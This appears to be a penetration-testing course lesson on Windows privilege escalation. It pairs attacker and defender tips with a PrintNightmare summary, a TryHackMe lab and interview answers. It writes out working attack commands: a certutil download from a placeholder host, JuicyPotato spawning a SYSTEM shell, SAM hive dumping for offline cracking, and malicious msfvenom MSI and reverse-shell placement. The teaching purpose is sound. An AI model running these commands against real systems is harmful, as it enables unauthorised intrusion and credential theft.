Privilege Escalation Windows

Windows privilege escalation is a different game than Linux. Today you exploit service permissions, unquoted paths, Token Impersonation, and AlwaysInstallElevated.

THEORY

Windows vs Linux privesc: Both share the same goal — go from low-privilege user to SYSTEM or Administrator. But Windows has unique attack surfaces: the Windows Service Control Manager (SCM), registry permissions, COM objects, named pipes, and token privileges. Where Linux has SUID and cron, Windows has vulnerable service paths, AlwaysInstallElevated, and Token Impersonation. Understanding the Windows security model — SIDs, ACLs, Tokens, and Integrity Levels — is prerequisite knowledge for every Windows privesc technique.

Five key Windows privesc vectors:

// 1. Unquoted Service Path — service binary path contains spaces, no quotes wmic service get name,pathname | findstr /i /v "C:\Windows\system32\" // 2. Weak Service Permissions — service can be modified by low-priv users sc sdshow SERVICE_NAME icacls "C:\Path\To\Service.exe" // 3. AlwaysInstallElevated — MSI files install with SYSTEM privileges reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated // 4. Token Impersonation — SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege whoami /priv // 5. Unattended Credentials — saved passwords in config files findstr /si password *.xml *.txt *.ini *.config *.bat

The token impersonation attack chain: If your user has SeImpersonatePrivilege (common for IIS, SQL Server, or service accounts), you can use tools like JuicyPotato or RoguePotato to trick a privileged process into authenticating to you, then impersonate its token to gain SYSTEM privileges. This technique works by exploiting DCOM or Named Pipe communication — the privileged process connects to your rogue server, and you steal its token.

Key insight: WinPEAS is Windows' equivalent of linpeas — one script enumerates services, registry, tokens, passwords, and every known privesc vector. Run it within 30 seconds of landing on a Windows target. It's not cheating; it's being efficient.
// attacker vs defender mindset
⚔ Attacker
  • Transfer WinPEAS to the target: certutil -urlcache -f http://YOUR_IP/winPEASx64.exe winpeas.exe — then execute and look for red-line findings (service misconfigurations, AlwaysInstallElevated, creds).
  • For unquoted service paths, check write permissions on each path segment. If C:\Program Files\Vuln App\ is writable, place service.exe there and restart the service.
  • Check whoami /priv — if SeImpersonatePrivilege is enabled, run JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * to spawn a SYSTEM shell.
  • Dump registry hives for passwords: reg save hklm\sam sam.hive and crack offline, or search reg query HKLM /f password /t REG_SZ /s.
🛡 Defender
  • Always quote service binary paths — "C:\Program Files\My Service\service.exe" prevents unquoted path hijacking.
  • Disable SeImpersonatePrivilege for service accounts wherever possible — configure your service to run as a virtual service account or managed service account (gMSA).
  • Set registry key AlwaysInstallElevated to 0 (disabled) via Group Policy — this MSI behavior should never be enabled on any domain-joined machine.
  • Regularly audit service permissions with sc sdshow and compare against baseline. Services with CHANGE permissions granted to BUILTIN\Users are a red flag.
// real named incident
2021 — PRINTNIGHTMARE (CVE-2021-34527) — WINDOWS PRINT SPOOLER
Remote code execution in Windows Print Spooler allowed attackers to execute code with SYSTEM privileges
The PrintNightmare vulnerability (CVE-2021-34527) in the Windows Print Spooler service allowed unauthenticated remote code execution with SYSTEM privileges. The flaw existed in the RPC endpoint that handles printer driver installation — it failed to properly validate that the caller had administrative privileges. Attackers could send a specially crafted print request that loaded a malicious DLL into the Print Spooler process, which runs as SYSTEM. Within days of disclosure, ransomware groups including Vice Society and LockBit incorporated PrintNightmare into their initial access chains. Microsoft issued emergency patches, and the vulnerability highlighted the danger of the Print Spooler service running by default on all Windows systems — a design decision Microsoft reversed in Windows 11 (removing the default installation).
HANDS-ON LAB

Goal: enumerate a Windows target and escalate privileges to SYSTEM using at least two distinct techniques.

  1. Deploy a vulnerable Windows VM (TryHackMe "Windows PrivEsc Arena" is free). Connect via RDP or Evil-WinRM with provided low-priv credentials.
  2. Run whoami and whoami /priv to understand your current context.
  3. Upload and run WinPEAS: certutil -urlcache -f http://YOUR_IP/winPEASx64.exe winpeas.exe && winpeas.exe. Study the red-highlighted findings.
  4. If WinPEAS flags an unquoted service path, use sc qc SERVICE_NAME to view config, then icacls "C:\Program Files\Vuln\..." to check write permissions. Write a reverse shell EXE to the writable path.
  5. Check AlwaysInstallElevated: reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated. If 1, generate a malicious MSI with msfvenom and run it.
  6. For each successful escalation, document the exact commands, the configuration error exploited, and the defensive control that should have prevented it.
Deliverable: A documented Windows privesc chain with at least two unique routes to SYSTEM. Include screenshots of WinPEAS output showing the vulnerable configuration and the escalation commands.

INTERVIEW READY
Q: "What's the difference between Linux and Windows privilege escalation methodologies?"
A: "On Linux I check SUID, sudo, cron, and kernel exploits. On Windows I check service permissions, unquoted paths, AlwaysInstallElevated, token privileges, and registry-automated scripts. The tools differ — linpeas for Linux, WinPEAS and PowerUp for Windows. But the methodology is the same: automated enumeration first, then manual verification of high-severity findings. The Windows service model (SCM) is a much richer attack surface than anything in Linux — every service is a potential privesc vector."
Q: "Explain how the AlwaysInstallElevated privilege escalation works."
A: "AlwaysInstallElevated is a registry setting that, when enabled, allows any user to install Windows Installer (MSI) packages with SYSTEM privileges. It's controlled by two registry keys — one in HKLM and one in HKCU — and both must be set to 1. As an attacker, I generate a malicious MSI using msfvenom that contains a reverse shell payload. When I execute it with msiexec, the MSI runs with SYSTEM privileges because of the registry policy."
Q: "What is SeImpersonatePrivilege and how do you abuse it?"
A: "SeImpersonatePrivilege allows a process to impersonate a user after authentication. It's commonly granted to service accounts, IIS APPPOOL accounts, and SQL Server accounts. Tools like JuicyPotato and RoguePotato exploit this by setting up a rogue DCOM or named pipe server. A SYSTEM-level service connects to this rogue server as part of normal operation, and we use DuplicateToken to create a token for that SYSTEM process, then spawn a new process with that token. This gives us a SYSTEM shell."
